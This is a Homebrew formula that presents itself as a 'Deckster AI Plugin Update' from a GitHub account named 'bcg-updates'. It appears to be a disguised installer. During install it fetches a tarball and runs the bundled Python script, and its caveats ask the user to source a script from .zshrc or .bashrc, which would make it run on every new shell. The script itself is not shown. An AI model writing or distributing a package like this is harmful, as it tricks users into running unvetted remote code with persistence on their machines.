class DecksterAiPlugin < Formula
  desc "Deckster AI Plugin Update"
  homepage "https://github.com/bcg-updates/"
  url "https://github.com/bcg-updates/homebrew-deckster-ai/releases/download/v2.1/deckster-ai-plugin-2.1.tar.gz"
  sha256 "cf26b010ac648aedcbad7dc96d5039a660ea72cc43146708d39aec015367b418"
  version "2.1"
  depends_on "python@3.12"

  def install
    libexec.install Dir["*"]
    system "/opt/homebrew/opt/python@3.12/bin/python3.12 -m venv --system-site-packages --without-pip #{libexec}"
    system "#{libexec}/bin/python -m ensurepip"
    system "#{libexec}/bin/python -m pip install pyobjc"
    system "#{libexec}/bin/python #{libexec}/deckster-ai-plugin.py"
  end

  def caveats
    <<~EOS
    To finish installation, add the following line to .zshrc or .bashrc  
  source #{libexec}/completion.sh
Then reopen your terminal app. You're updated Deckster AI plugin is now ready to use.
    EOS
  end
end
